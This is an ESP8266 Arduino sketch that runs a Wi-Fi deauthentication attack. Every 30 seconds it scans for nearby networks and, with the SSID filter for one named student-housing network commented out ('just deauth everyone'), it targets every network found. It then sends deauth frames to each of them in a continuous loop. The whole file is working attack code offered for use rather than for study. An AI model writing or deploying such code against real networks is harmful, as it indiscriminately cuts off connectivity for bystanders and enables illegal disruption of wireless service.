#include "Attack.h"

#include <ESP8266WiFi.h>
#include <Esp.h>

#include <vector>

#define SCAN_DELAY 30000
#define DEAUTH_DELAY 200

Attack attack;
unsigned long timer = 0;

void setup() {
  WiFi.softAPdisconnect (true);
	Serial.begin(115200);
}

void loop() {
  Serial.println("Scanning...");

  // find all networks, then store all relevant targets
  int targets[64];
  int num_targets = 0;
	int num_networks = WiFi.scanNetworks();
	for (int i = 0; i < num_networks; i++) {
    // just deauth everyone
		// if (WiFi.SSID(i) == "FlatXGulsonCourtStudentInternet") {
		if (true) {
      targets[num_targets++] = i;
    }
	}

  // a printout
  Serial.print("Attacking...");
  for (int i = 0; i < num_targets; i++){
    Serial.print(targets[i]);
    Serial.print(" ");
  }
  Serial.println("");
  
  // start the attack
  unsigned long scan_timer = millis();
  while (millis() - scan_timer < SCAN_DELAY) {
    // start deauthing targets, wait 10 ms in between each
    unsigned long deauth_timer = millis();
    for (int id = 0; id < num_targets; id++) {
      if (!attack.deauth(targets[id])) {
        Serial.println("Something went wrong here!");
      }
      delay(10);
    }
    
    // sleep for the remainder of the time
    int remaining_time = DEAUTH_DELAY - (millis() - deauth_timer);
    if (remaining_time > 0) {
      delay(remaining_time);
    }
  }
}
